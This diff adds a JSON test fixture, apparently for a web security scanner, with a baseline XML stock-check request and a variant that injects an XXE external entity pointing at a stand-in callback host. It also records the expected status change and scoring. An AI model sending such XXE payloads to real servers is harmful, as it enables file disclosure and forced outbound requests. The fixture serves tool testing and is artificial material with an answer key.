@@ -1,0 +1,34 @@
+{
+  "payload": {
+    "raw_request": "POST /stock HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/xml\r\n\r\n<stockCheck><productId>2</productId></stockCheck>",
+    "raw_response": "HTTP/1.1 400 Bad Request\r\nContent-Type: application/xml\r\nContent-Length: 31\r\n\r\n<error>Invalid XML</error>",
+    "target_url": "https://example.com/stock",
+    "repeater_variant_observations": [
+      {
+        "tab_name": "variant-1",
+        "summary": "Parser behavior variant",
+        "request_text": "POST /stock HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/xml\r\n\r\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://callback.example\">]><stockCheck><productId>&xxe;</productId></stockCheck>",
+        "response_text": "HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nX-Parser: legacy\r\nContent-Length: 77\r\n\r\n<stockCheck><productId>callback.example</productId><storeId>1</storeId></stockCheck>"
+      }
+    ]
+  },
+  "plan": {
+    "scanner_focus": {
+      "highlights": [
+        {"text": "callback.example"}
+      ]
+    },
+    "repeater_variant_requests": [
+      {
+        "name": "variant-1",
+        "expected_signal": "The parser behavior changes in the same request path without touching sensitive targets."
+      }
+    ]
+  },
+  "expected": {
+    "best_tab": "variant-1",
+    "min_score": 2.0,
+    "high_signal": true,
+    "status_transition": "400->200"
+  }
+}
